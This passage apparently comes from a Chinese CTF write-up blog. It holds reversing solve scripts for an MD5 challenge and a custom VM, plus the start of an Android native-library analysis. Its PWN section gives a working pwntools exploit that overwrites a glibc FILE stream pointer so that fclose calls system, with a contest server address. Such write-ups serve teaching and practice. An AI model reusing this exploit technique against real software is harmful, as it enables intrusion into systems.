0x30, 0x33, 0x64,  0x32, 0x66, 0x33, 0x62, 0x61, 0x00, 0x61, 0x30, 0x31, 0x38, 0x34, 0x66,  0x38, 0x32, 0x34, 0x30, 0x65, 0x32, 0x66, 0x65, 0x34, 0x36, 0x38, 0x36,  0x31, 0x64, 0x63, 0x38, 0x64, 0x31, 0x35, 0x61, 0x38, 0x31, 0x39, 0x63,  0x62, 0x30, 0x00, 0x39, 0x64, 0x62, 0x65, 0x63, 0x34, 0x31, 0x34, 0x33,  0x33, 0x36, 0x65, 0x37, 0x34, 0x31, 0x65, 0x39, 0x63, 0x37, 0x33, 0x34,  0x32, 0x32, 0x64, 0x66, 0x35, 0x39, 0x64, 0x65, 0x32, 0x39, 0x37, 0x00,  0x36, 0x66, 0x62, 0x35, 0x32, 0x30, 0x39, 0x64, 0x38, 0x66, 0x63, 0x38,  0x62, 0x62, 0x38, 0x35, 0x30, 0x37, 0x32, 0x34, 0x35, 0x62, 0x63, 0x66,  0x61, 0x32, 0x34, 0x61, 0x65, 0x31, 0x31, 0x66, 0x00, 0x36, 0x66, 0x62,  0x35, 0x32, 0x30, 0x39, 0x64, 0x38, 0x66, 0x63, 0x38, 0x62, 0x62, 0x38,  0x35, 0x30, 0x37, 0x32, 0x34, 0x35, 0x62, 0x63, 0x66, 0x61, 0x32, 0x34,  0x61, 0x65, 0x31, 0x31, 0x66, 0x00, 0x30, 0x30, 0x63, 0x37, 0x37, 0x66,  0x62, 0x63, 0x36, 0x30, 0x61, 0x35, 0x62, 0x66, 0x63, 0x34, 0x36, 0x36,  0x64, 0x33, 0x64, 0x30, 0x36, 0x39, 0x38, 0x37, 0x36, 0x65, 0x63, 0x33,  0x34, 0x38, 0x00, 0x30, 0x30, 0x63, 0x37, 0x37, 0x66, 0x62, 0x63, 0x36,  0x30, 0x61, 0x35, 0x62, 0x66, 0x63, 0x34, 0x36, 0x36, 0x64, 0x33, 0x64,  0x30, 0x36, 0x39, 0x38, 0x37, 0x36, 0x65, 0x63, 0x33, 0x34, 0x38, 0x00,  0x64, 0x66, 0x33, 0x33, 0x34, 0x36, 0x34, 0x66, 0x62, 0x34, 0x37, 0x31,  0x63, 0x34, 0x36, 0x61, 0x62, 0x61, 0x66, 0x36, 0x39, 0x31, 0x63, 0x30,  0x30, 0x30, 0x61, 0x30, 0x65, 0x33, 0x30, 0x64, 0x00, 0x34, 0x66, 0x64,  0x61, 0x63, 0x35, 0x61, 0x63, 0x38, 0x30, 0x37, 0x35, 0x30, 0x36, 0x39,  0x33, 0x38, 0x31, 0x30, 0x33, 0x65, 0x37, 0x37, 0x35, 0x63, 0x35, 0x30,  0x30, 0x39, 0x39, 0x65, 0x64, 0x00, 0x66, 0x36, 0x30, 0x64, 0x37, 0x30,  0x39, 0x63, 0x63, 0x66, 0x39, 0x38, 0x39, 0x64, 0x38, 0x34, 0x39, 0x30,  0x32, 0x38, 0x66, 0x39, 0x37, 0x61, 0x30, 0x33, 0x64, 0x32, 0x66, 0x33,  0x62, 0x61, 0x00, 0x66, 0x63, 0x63, 0x39, 0x34, 0x61, 0x32, 0x30, 0x35,  0x39, 0x36, 0x66, 0x32, 0x36, 0x31, 0x39, 0x38, 0x36, 0x38, 0x66, 0x33,  0x61, 0x34, 0x62, 0x66, 0x35, 0x32, 0x65, 0x61, 0x64, 0x66, 0x37, 0x00,  0x30, 0x30, 0x63, 0x37, 0x37, 0x66, 0x62, 0x63, 0x36, 0x30, 0x61, 0x35,  0x62, 0x66, 0x63, 0x34, 0x36, 0x36, 0x64, 0x33, 0x64, 0x30, 0x36, 0x39,  0x38, 0x37, 0x36, 0x65, 0x63, 0x33, 0x34, 0x38, 0x00, 0x64, 0x31, 0x36,  0x38, 0x63, 0x32, 0x31, 0x64, 0x31, 0x30, 0x33, 0x37, 0x31, 0x61, 0x35,  0x61, 0x62, 0x36, 0x31, 0x62, 0x63, 0x66, 0x65, 0x36, 0x63, 0x37, 0x35,  0x39, 0x65, 0x66, 0x36, 0x65, 0x00, 0x39, 0x64, 0x62, 0x65, 0x63, 0x34,  0x31, 0x34, 0x33, 0x33, 0x36, 0x65, 0x37, 0x34, 0x31, 0x65, 0x39, 0x63,  0x37, 0x33, 0x34, 0x32, 0x32, 0x64, 0x66, 0x35, 0x39, 0x64, 0x65, 0x32,  0x39, 0x37, 0x00, 0x66, 0x63, 0x63, 0x39, 0x34, 0x61, 0x32, 0x30, 0x35,  0x39, 0x36, 0x66, 0x32, 0x36, 0x31, 0x39, 0x38, 0x36, 0x38, 0x66, 0x33,  0x61, 0x34, 0x62, 0x66, 0x35, 0x32, 0x65, 0x61, 0x64, 0x66, 0x37, 0x00,  0x39, 0x62, 0x33, 0x37, 0x64, 0x62, 0x30, 0x39, 0x31, 0x39, 0x37, 0x39,  0x62, 0x65, 0x64, 0x66, 0x30, 0x30, 0x61, 0x37, 0x30, 0x39, 0x35, 0x38,  0x35, 0x31, 0x62, 0x61, 0x36, 0x66, 0x35, 0x39, 0x00, 0x30, 0x30, 0x63,  0x37, 0x37, 0x66, 0x62, 0x63, 0x36, 0x30, 0x61, 0x35, 0x62, 0x66, 0x63,  0x34, 0x36, 0x36, 0x64, 0x33, 0x64, 0x30, 0x36, 0x39, 0x38, 0x37, 0x36,  0x65, 0x63, 0x33, 0x34, 0x38, 0x00, 0x66, 0x36, 0x30, 0x64, 0x37, 0x30,  0x39, 0x63, 0x63, 0x66, 0x39, 0x38, 0x39, 0x64, 0x38, 0x34, 0x39, 0x30,  0x32, 0x38, 0x66, 0x39, 0x37, 0x61, 0x30, 0x33, 0x64, 0x32, 0x66, 0x33,  0x62, 0x61, 0x00, 0x66, 0x63, 0x63, 0x39, 0x34, 0x61, 0x32, 0x30, 0x35,  0x39, 0x36, 0x66, 0x32, 0x36, 0x31, 0x39, 0x38, 0x36, 0x38, 0x66, 0x33,  0x61, 0x34, 0x62, 0x66, 0x35, 0x32, 0x65, 0x61, 0x64, 0x66, 0x37, 0x00,  0x64, 0x31, 0x36, 0x38, 0x63, 0x32, 0x31, 0x64, 0x31, 0x30, 0x33, 0x37,  0x31, 0x61, 0x35, 0x61, 0x62, 0x36, 0x31, 0x62, 0x63, 0x66, 0x65, 0x36,  0x63, 0x37, 0x35, 0x39, 0x65, 0x66, 0x36, 0x65, 0x00, 0x66, 0x36, 0x30,  0x64, 0x37, 0x30, 0x39, 0x63, 0x63, 0x66, 0x39, 0x38, 0x39, 0x64, 0x38,  0x34, 0x39, 0x30, 0x32, 0x38, 0x66, 0x39, 0x37, 0x61, 0x30, 0x33, 0x64,  0x32, 0x66, 0x33, 0x62, 0x61, 0x00, 0x31, 0x38, 0x33, 0x33, 0x34, 0x32,  0x39, 0x39, 0x37, 0x66, 0x66, 0x65, 0x64, 0x34, 0x62, 0x33, 0x31, 0x38,  0x39, 0x65, 0x39, 0x37, 0x37, 0x64, 0x30, 0x37, 0x37, 0x61, 0x36, 0x30,  0x62, 0x34, 0x00, 0x66, 0x34, 0x30, 0x34, 0x61, 0x33, 0x33, 0x36, 0x38,  0x64, 0x32, 0x64, 0x38, 0x66, 0x35, 0x37, 0x34, 0x36, 0x34, 0x66, 0x37,  0x33, 0x39, 0x64, 0x34, 0x65, 0x64, 0x30, 0x31, 0x63, 0x30, 0x65, 0x00,  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x78, 0xa4, 0x6a, 0xd7, 0x56, 0xb7, 0xc7, 0xe8, 0xdb, 0x70, 0x20, 0x24,  0xee, 0xce, 0xbd, 0xc1, 0xaf, 0x0f, 0x7c, 0xf5, 0x2a, 0xc6, 0x87, 0x47,  0x13, 0x46, 0x30, 0xa8, 0x01, 0x95, 0x46, 0xfd, 0xd8, 0x98, 0x80, 0x69,  0xaf, 0xf7, 0x44, 0x8b, 0xb1, 0x5b, 0xff, 0xff, 0xbe, 0xd7, 0x5c, 0x89,  0x22, 0x11, 0x90, 0x6b, 0x93, 0x71, 0x98, 0xfd, 0x8e, 0x43, 0x79, 0xa6,  0x21, 0x08, 0xb4, 0x49, 0x62, 0x25, 0x1e, 0xf6, 0x40, 0xb3, 0x40, 0xc0,  0x51, 0x5a, 0x5e, 0x26, 0xaa, 0xc7, 0xb6, 0xe9, 0x5d, 0x10, 0x2f, 0xd6,  0x53, 0x14, 0x44, 0x02, 0x81, 0xe6, 0xa1, 0xd8, 0xc8, 0xfb, 0xd3, 0xe7,  0xe6, 0xcd, 0xe1, 0x21, 0xd6, 0x07, 0x37, 0xc3, 0x87, 0x0d, 0xd5, 0xf4,  0xed, 0x14, 0x5a, 0x45, 0x05, 0xe9, 0xe3, 0xa9, 0xf8, 0xa3, 0xef, 0xfc,  0xd9, 0x02, 0x6f, 0x67, 0x8a, 0x4c, 0x2a, 0x8d, 0x42, 0x39, 0xfa, 0xff,  0x81, 0xf6, 0x71, 0x87, 0x22, 0x61, 0x9d, 0x6d, 0x0c, 0x38, 0xe5, 0xfd,  0x44, 0xea, 0xbe, 0xa4, 0xa9, 0xcf, 0xde, 0x4b, 0x60, 0x4b, 0xbb, 0xf6,  0x70, 0xbc, 0xbf, 0xbe, 0xc6, 0x7e, 0x9b, 0x28, 0xfa, 0x27, 0xa1, 0xea,  0x85, 0x30, 0xef, 0xd4, 0x05, 0x1d, 0x88, 0x04, 0x39, 0xd0, 0xd4, 0xd9,  0xe5, 0x99, 0xdb, 0xe6, 0xf8, 0x7c, 0xa2, 0x1f, 0x65, 0x56, 0xac, 0xc4,  0x44, 0x22, 0x29, 0xf4, 0x97, 0xff, 0x2a, 0x43, 0xa7, 0x23, 0x94, 0xab,  0x39, 0xa0, 0x93, 0xfc, 0xc3, 0x59, 0x5b, 0x65, 0x92, 0xcc, 0x0c, 0x8f,  0x7d, 0xf4, 0xef, 0xff, 0xd1, 0x5d, 0x84, 0x85, 0x4f, 0x7e, 0xa8, 0x6f,  0xe0, 0xe6, 0x2c, 0xfe, 0x14, 0x43, 0x01, 0xa3, 0xa1, 0x11, 0x08, 0x4e,  0x82, 0x7e, 0x53, 0xf7, 0x35, 0xf2, 0x3a, 0xbd, 0xbb, 0xd2, 0xd7, 0x2a,  0x91, 0xd3, 0x86, 0xeb, 0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00,  0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,  0x0c, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00,  0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00,  0x16, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00,  0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,  0x09, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00,  0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00,  0x14, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00,  0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,  0x09, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00,  0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,  0x17, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00,  0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,  0x0b, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00,  0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,  0x17, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00,  0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00,  0x0a, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00,  0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00,  0x15, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00,  0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x32, 0x33, 0x33, 0x33,  0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,  0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,  0x33, 0x33, 0x33, 0x33]s = &#39;&#39;for c in data:    s += chr(c)# print senc = &#39;562fe3cc50014c260d9e8cf4ed38c77ac022ad0cc0075a9ab14b412a1082d5f364c286cfc623aa8d7df7c088ebf7d71883664bdee4b613b7e7a51b5213470a8db020bf598aaa2b3e03ed02c85436268a4fdac5ac807506938103e775c50099ed4fdac5ac807506938103e775c50099edc231d607b6823fd0a68e813760809754d168c21d10371a5ab61bcfe6c759ef6ef60d709ccf989d849028f97a03d2f3baa0184f8240e2fe46861dc8d15a819cb09dbec414336e741e9c73422df59de2976fb5209d8fc8bb8507245bcfa24ae11f6fb5209d8fc8bb8507245bcfa24ae11f00c77fbc60a5bfc466d3d069876ec34800c77fbc60a5bfc466d3d069876ec348df33464fb471c46abaf691c000a0e30d4fdac5ac807506938103e775c50099edf60d709ccf989d849028f97a03d2f3bafcc94a20596f2619868f3a4bf52eadf700c77fbc60a5bfc466d3d069876ec348d168c21d10371a5ab61bcfe6c759ef6e9dbec414336e741e9c73422df59de297fcc94a20596f2619868f3a4bf52eadf79b37db091979bedf00a7095851ba6f5900c77fbc60a5bfc466d3d069876ec348f60d709ccf989d849028f97a03d2f3bafcc94a20596f2619868f3a4bf52eadf7d168c21d10371a5ab61bcfe6c759ef6ef60d709ccf989d849028f97a03d2f3ba183342997ffed4b3189e977d077a60b4f404a3368d2d8f57464f739d4ed01c0e&#39;e = []for i in range(len(enc) / 32):    e.append(enc[32*i:32*i+32])print ekey = &#39;23333333333333333333333333333333&#39;[:-1]print keyflag = &#39;&#39;for i in range(32):    for ch in range(256):        x = hashlib.md5(key + chr(ch)).digest()        x = x.encode(&#39;hex&#39;).lower()        x = hashlib.md5(x).digest()        x = x.encode(&#39;hex&#39;).lower()        if x == e[i]:            flag += chr(ch)            breakprint flag</code></pre><h2 id="EASYVM"><a href="#EASYVM" class="headerlink" title="EASYVM"></a>EASYVM</h2><p>第一次做的时候手撸：</p><pre><code>0x05, 0x01, 0x0B,   // mov r1, rB0x13, 0x03, 0x03,   // xor r3, r30x13, 0x00, 0x00,   // xor r0, r00x13, 0x04, 0x04,   // xor r4, r4r1 = rB;r3 = r0 = r4 = 0;0x28,               // enter the looploop:0x0C, 0x00, 0x33,   // add r0, 0x330x14, 0x00, 0x20,   // mov r0, r0 mod 0x200x05, 0x09, 0x01,   // mov r9, r10x11, 0x09, 0x00,   // add_pch r9, r00x0B, 0x0A, 0x09,   // ldr_ch rA, r90x01, 0x04, 0x0A,   // mov r4, rA0x1B, 0x05, 0x04,   // push r5, r40x0C, 0x03, 0x01,   // add r3, 0x010x24, 0x03, 0x20,   // cmpl r3, 0x200x28,               // jl loopwhile(1)    // loop 0x20 times{    r0 += 0x33;    r0 = r0 % 0x20;    r9 = r1;    r9 += r0;    rA = r9;    r4 = rA;    r5 = r4 + 1;    r3 += 0x01;    if(r3 &gt;= 0x20)        break;}0x13, 0x00, 0x00,   // xor r0, r00x07, 0x08, 0x05,   // lea_int r8, r50x0E, 0x08, 0xE0,   // add r8, 0xE00x07, 0x02, 0x08,   // lea_int r2, r80x09, 0x0A, 0x02,   // ldr_int rA, r20x01, 0x00, 0x0A,   // mov r0, rA0x18, 0x00, 0xE0,   // and r0, 0xE00x1E, 0x00, 0x05,   // shr r0, 0x050x01, 0x04, 0x00,   // mov r4, r00x13, 0x03, 0x03,   // xor r3, r3r0 = 0;r8 = r5;r8 += 0xE0;r2 = r8;rA = r2;r0 = rA;r0 &amp;= 0xE0;r0 &gt;&gt;= 0x05;r0 &amp;= 0xFF;r4 = r0;r3 = 0;0x28,               // enter the looploop:0x09, 0x0A, 0x02,   // ldr_int rA, r20x01, 0x00, 0x0A,   // mov r0, rA0x18, 0x00, 0x1F,   // and r0, 0x1F0x20, 0x00, 0x03,   // shl r0, 0x030x1B, 0x05, 0x00,   // push r5, r00x07, 0x08, 0x05,   // lea_int r8, r50x0E, 0x08, 0xE0,   // add r8, 0xE00x07, 0x02, 0x08,   // lea_int r2, r80x09, 0x0A, 0x02,   // ldr_int rA, r20x01, 0x00, 0x0A,   // mov, r0, rA0x18, 0x00, 0xE0,   // and r0, 0xE00x1E, 0x00, 0x05,   // shr r0, 0x050x1D, 0x05, 0x0A,   // pop r5, rA0x0D, 0x0A, 0x00,   // add rA, r00x1B, 0x05, 0x0A,   // push r5, rA0x0C, 0x03, 0x01,   // add r3, 0x010x24, 0x03, 0x1F,   // cmpl r3, 0x1F0x28,               // jl loopwhile(1)    // loop 0x1F times{    rA = r2;    r0 = rA;    r0 &amp;= 0x1F;    r0 &lt;&lt;= 0x03;    r0 &amp;= 0xFF;    r5 = r0 + 1;    r8 = r5;    r8 += 0xE0;    r2 = r8;    rA = r2;    r0 = rA;    r0 &amp;= 0xE0;    r0 &gt;&gt;= 0x05;    r0 &amp;= 0xFF;    rA = r5 - 1;    rA += r0;    r5 = rA + 1;    r3 += 1;    if(r3 &gt;= 0x1F)        break;}0x09, 0x0A, 0x02,   // ldr_int rA, r20x01, 0x00, 0x0A,   // mov r0, rA0x18, 0x00, 0x1F,   // and r0, 0x1F0x20, 0x00, 0x03,   // shl r0, 0x030x0D, 0x00, 0x04,   // add r0, r40x1B, 0x05, 0x00,   // push r5, r00x13, 0x03, 0x03,   // xor r3, r30x03, 0x04, 0x0D,   // mov, r4, rD  // 0xEFBEADDE0x28,               // enter the looprA = r2;r0 = rA;r0 &amp;= 0x1F;r0 &lt;&lt;= 0x03;r0 &amp;= 0xFF;r0 += r4;r5 = r0 + 1;r3 = 0;r4 = rD;loop:0x07, 0x08, 0x05,   // lea_int r8, r50x0E, 0x08, 0xE0,   // add r8, 0xE00x07, 0x02, 0x08,   // lea_int r2, r80x09, 0x0A, 0x02,   // ldr_int rA, r20x01, 0x00, 0x0A,   // mov, r0, rA0x1B, 0x05, 0x00,   // push r5, r00x01, 0x00, 0x04,   // mov r0, r40x0D, 0x00, 0x03,   // and r0, r30x1D, 0x05, 0x0A,   // pop r5, rA0x13, 0x0A, 0x00,   // xor rA, r00x1B, 0x05, 0x0A,   // push r5, rA0x22, 0x04, 0x08,   // ror r4, 0x080x0C, 0x03, 0x01,   // add r3, 0x010x24, 0x03, 0x20,   // cmpl r3, 0x200x28,               // jl loopwhile(1)    // loop 0x20 times{    r8 = r5;    r8 += 0xE0;    r2 = r8;    rA = r2;    r0 = rA;    r5 = r0 + 1;    r0 = r4;    r0 += r3;    rA = r5 - 1;    rA ^= r0;    r5 = rA + 1;    r4 = (1 &lt;&lt; 8 - 1) &amp; (r4 &lt;&lt; 24) + ((1 &lt;&lt; 24 - 1) &amp; (r4 &gt;&gt; 8));    r3 += 1;    if(r3 &gt;= 0x20)        break;}0x13, 0x03, 0x03,   // xor r3, r30x13, 0x04, 0x04,   // xor r4, r40x05, 0x01, 0x0C,   // mov r1, rC   // enc0x28,               // enter the loopr3 = r4 = 0;r1 = rC;loop:0x05, 0x09, 0x01,   // mov r9, r10x11, 0x09, 0x03,   // add_pch r9, r30x0B, 0x0A, 0x09,   // ldr_ch rA, r90x01, 0x00, 0x0A,   // mov r0, rA0x1B, 0x05, 0x00,   // push r5, r00x07, 0x08, 0x05,   // lea_int r8, r50x0E, 0x08, 0xDF,   // add r8, 0xDF0x09, 0x0A, 0x08,   // ldr_int rA, r80x1D, 0x05, 0x00,   // pop r5, r00x1B, 0x05, 0x00,   // push r5, r00x27, 0x00, 0x0A,   // cmpeq r0, rA0x17, 0x04, 0x07,   // mov r4, r4 | r70x0C, 0x03, 0x01,   // add r3, 0x010x24, 0x03, 0x20,   // cmpl r3, 0x200x28                // jl loopwhile(1)    // loop 0x20 times{    r9 = r1;    r9 += r3;    rA = r9;    r0 = rA;    r5 = r0 + 1;    r8 = r5;    r8 += 0xDF;    rA = r8;    r0 = r5 - 1;    r5 = r0 + 1;    r0 != rA    r4 |= r7;    r3 += 1;    if(r3 &gt;= 0x20)        break;}</code></pre><p>其实还是挺清楚的，可以逆出来。脚本如下：</p><pre><code class="python"># reverse step3enc1 = [0x75, 0x85, 0xD1, 0x39, 0x0B, 0x29, 0xCD, 0x77, 0x6D, 0x9F, 0x73, 0x23, 0x61, 0x8B, 0x4D, 0x45, 0x9D, 0x8F, 0x5B, 0x11, 0xC1, 0xC9, 0xE5, 0xCF, 0x45, 0xE5, 0xB1, 0xB3, 0x41, 0xD9, 0xCF, 0xCF]key = [0xDE, 0xAD, 0xBE, 0xEF]enc2 = [enc1[i] ^ ((key[i % 4] + i) &amp; 0xFF) for i in range(32)]# reverse step2enc3 = [0 for i in range(32)]def f(a, b):    return ((a &lt;&lt; 5) &amp; 0xE0 | (b &gt;&gt; 3) &amp; 0x1F)for i in range(1, 32):    enc3[i] = f(enc2[i - 1], enc2[i])enc3[0] = f(enc2[31], enc2[0])# reverse step1enc4 = [0 for i in range(32)]j = 0for i in range(32):    j += 0x33    enc4[j % 0x20] = enc3[i]flag = &#39;&#39;for ch in enc4:    flag += chr(ch)print flag</code></pre><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Challenge1"><a href="#Challenge1" class="headerlink" title="Challenge1"></a>Challenge1</h2><p>利用了 <code>_IO_FILE</code> 的相关漏洞，和之前一道练习题很类似：</p><pre><code class="cpp">__int64 __fastcall main(__int64 a1, char **a2, char **a3){  int c; // [rsp+Ch] [rbp-4h]  stream = fopen(&quot;test.txt&quot;, &quot;r&quot;);  init_func();  while ( 1 )  {    while ( 1 )    {      putchar(&#39;&gt;&#39;);      c = readline();      if ( c != 1 )        break;      get_s();    }    if ( c != 2 )      break;    put_s();  }  if ( c == 3 )    close_stream();  return 0LL;}</code></pre><p>输入的 s 可以覆盖掉 stream 指针，偏移是 0x100。</p><pre><code class="ida">.bss:00000000006010C0 s               db 100h dup(?)          ; DATA XREF: get_s+4↑o.bss:00000000006010C0                                         ; put_s+4↑o.bss:00000000006011C0 ; FILE *stream.bss:00000000006011C0 stream          dq ?                    ; DATA XREF: close_stream+4↑r</code></pre><p>关于 <code>_IO_FILE</code> 一些 symbol 在 gdb 里可以看：</p><pre><code class="gdb">assassinq&gt;&gt; p sizeof(FILE)$1 = 0xd8assassinq&gt;&gt; p sizeof(struct _IO_FILE_plus)$2 = 0xe0assassinq&gt;&gt; p *(struct _IO_FILE_plus *)stdin$3 = {  file = {    _flags = 0xfbad208b,    _IO_read_ptr = 0x7ffff7dcfa84 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;,    _IO_read_end = 0x7ffff7dcfa84 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;,    _IO_read_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,    _IO_write_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,    _IO_write_ptr = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,    _IO_write_end = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,    _IO_buf_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,    _IO_buf_end = 0x7ffff7dcfa84 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;,    _IO_save_base = 0x0,    _IO_backup_base = 0x0,    _IO_save_end = 0x0,    _markers = 0x0,    _chain = 0x0,    _fileno = 0x0,    _flags2 = 0x0,    _old_offset = 0xffffffffffffffff,    _cur_column = 0x0,    _vtable_offset = 0x0,    _shortbuf = &quot;\n&quot;,    _lock = 0x7ffff7dd18d0 &lt;_IO_stdfile_0_lock&gt;,    _offset = 0xffffffffffffffff,    _codecvt = 0x0,    _wide_data = 0x7ffff7dcfae0 &lt;_IO_wide_data_0&gt;,    _freeres_list = 0x0,    _freeres_buf = 0x0,    __pad5 = 0x0,    _mode = 0xffffffff,    _unused2 = &#39;\000&#39; &lt;repeats 19 times&gt;  },  vtable = 0x7ffff7dcc2a0 &lt;_IO_file_jumps&gt;}assassinq&gt;&gt; p *((struct _IO_FILE_plus *)stdin).vtable$4 = {  __dummy = 0x0,  __dummy2 = 0x0,  __finish = 0x7ffff7a70330 &lt;_IO_new_file_finish&gt;,  __overflow = 0x7ffff7a71300 &lt;_IO_new_file_overflow&gt;,  __underflow = 0x7ffff7a71020 &lt;_IO_new_file_underflow&gt;,  __uflow = 0x7ffff7a723c0 &lt;__GI__IO_default_uflow&gt;,  __pbackfail = 0x7ffff7a73c50 &lt;__GI__IO_default_pbackfail&gt;,  __xsputn = 0x7ffff7a6f930 &lt;_IO_new_file_xsputn&gt;,  __xsgetn = 0x7ffff7a6f590 &lt;__GI__IO_file_xsgetn&gt;,  __seekoff = 0x7ffff7a6eb90 &lt;_IO_new_file_seekoff&gt;,  __seekpos = 0x7ffff7a72990 &lt;_IO_default_seekpos&gt;,  __setbuf = 0x7ffff7a6e850 &lt;_IO_new_file_setbuf&gt;,  __sync = 0x7ffff7a6e6d0 &lt;_IO_new_file_sync&gt;,  __doallocate = 0x7ffff7a62100 &lt;__GI__IO_file_doallocate&gt;,  __read = 0x7ffff7a6f910 &lt;__GI__IO_file_read&gt;,  __write = 0x7ffff7a6f190 &lt;_IO_new_file_write&gt;,  __seek = 0x7ffff7a6e910 &lt;__GI__IO_file_seek&gt;,  __close = 0x7ffff7a6e840 &lt;__GI__IO_file_close&gt;,  __stat = 0x7ffff7a6f180 &lt;__GI__IO_file_stat&gt;,  __showmanyc = 0x7ffff7a73dd0 &lt;_IO_default_showmanyc&gt;,  __imbue = 0x7ffff7a73de0 &lt;_IO_default_imbue&gt;}</code></pre><p>想法是把 stream 覆盖成 bss 上构造的部分，fclose 就会触发 system，Exploit：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *binary = &#39;./task_challenge1&#39;elf = ELF(binary)context.log_level = &#39;debug&#39;context.arch = elf.archcontext.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]local = 1if local:    p = process(binary)else:    p = remote(&#39;202.112.51.184&#39;, 30003)ub_offset = 0x3c4b30p.sendlineafter(&#39;&gt;&#39;, &#39;1&#39;)gdb.attach(p)buf_addr = 0x6010C0system = 0x400897payload = (    (((&#39;\0&#39; * 0x10 + p64(system) + &#39;\0&#39; * 70).ljust(0x88,&#39;\0&#39;) + p64(buf_addr)).ljust(0xd8, &#39;\0&#39;) + p64(buf_addr)).ljust(0x100, &#39;\0&#39;) +    p64(buf_addr))p.sendline(payload)p.sendlineafter(&#39;&gt;&#39;, &#39;3&#39;)p.interactive()</code></pre><h1 id="MOBILE"><a href="#MOBILE" class="headerlink" title="MOBILE"></a>MOBILE</h1><h2 id="SWAG"><a href="#SWAG" class="headerlink" title="SWAG"></a>SWAG</h2><p>拖进 jadx，直接看 Mainactivity 中的函数，可以知道对输入数据进行了长度的判断和内容的正则判断。然后还存在 native 层，需要对 so 文件分析。</p><p>在 ida 里能看出经过两次加密过程，仔细发现其实是矩阵的一些操作，先对矩阵转置：</p><pre><code class="cpp">char **__fastcall matrix_transpos(char **matrix){  char *v1; // x8  char *v2; // x11  char *v3; // x8  char *v4; // x8  char *v5; // x8  char *v6; // x8  char *v7; // x8  char *v8; // x9  char *v9; // x8  char *v10; // x9  char *v11; // x8  char *v12; // x9  char *v13; // x8  char *v14; // x9  char *v15; // x8  char *v16; // x9  char *v17; // x8  char *v18; // x9  char *v19; // x8  char *v20; // x9  char *v21; // x8  char *v22; // x9  char *v23; // x8  char *v24; // x9  char *v25; // x8  char *v26; // x9  v1 = matrix[1];  LODWORD(v2) = *((_DWORD *)*matrix + 1);  *((_DWORD *)*matrix + 1) = *(_DWORD *)v1;  *(_DWORD *)v1 = (_DWORD)v2;  v3 = matrix[2];  LODWORD(v2) = *((_DWORD *)*matrix + 2);  *((_DWORD *)*matrix + 2) = *(_DWORD *)v3;  *(_DWORD *)v3 = (_DWORD)v2;  v4 = matrix[3];  LODWORD(v2) = *((_DWORD *)*matrix + 3);  *((_DWORD *)*matrix + 3) = *(_DWORD *)v4;  *(_DWORD *)v4 = (_DWORD)v2;  v5 = matrix[4];  LODWORD(v2) = *((_DWORD *)*matrix + 4);  *((_DWORD *)*matrix + 4) = *(_DWORD *)v5;  *(_DWORD *)v5 = (_DWORD)v2;  v6 = matrix[5];  LODWORD(v2) 